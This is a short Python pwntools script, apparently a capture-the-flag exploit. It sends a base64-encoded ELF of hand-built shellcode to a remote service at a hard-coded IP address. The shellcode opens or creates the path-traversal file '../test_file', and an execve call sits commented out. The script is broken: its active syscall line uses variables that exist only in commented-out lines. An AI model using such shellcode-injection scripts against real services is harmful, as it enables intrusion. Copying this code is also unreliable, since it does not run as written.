#!/usr/bin/env python3

import subprocess
from pathlib import Path

from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.arch = "amd64"

if args.REMOTE:
    io = remote("47.242.149.197", 7600)
else:
    io = process(["python3", "main.py"])

sc = """
    jmp do_it

open_path:
    .string "../test_file"
    .byte 0

do_it:
    lea rax,[rip+open_path]
"""
# at_fdcwd = -100
# flags = constants.O_CREAT
# mode = constants.S_IRWXU
# sc += shellcraft.syscall("SYS_openat", at_fdcwd, "rax", flags, mode)
sc += shellcraft.syscall("SYS_openat", at_fdcwd, "rax", flags, mode)
# sc += shellcraft.syscall("SYS_execve", "rax", "rbx", "rcx")
sc += shellcraft.exit(1)

elf_file = make_elf_from_assembly(sc)
with open(elf_file, "rb") as f:
    elf_bytes = f.read()
encoded_elf_bytes = base64.b64encode(elf_bytes)

io.sendlineafter("Your Binary(base64):\n", encoded_elf_bytes)
io.interactive()
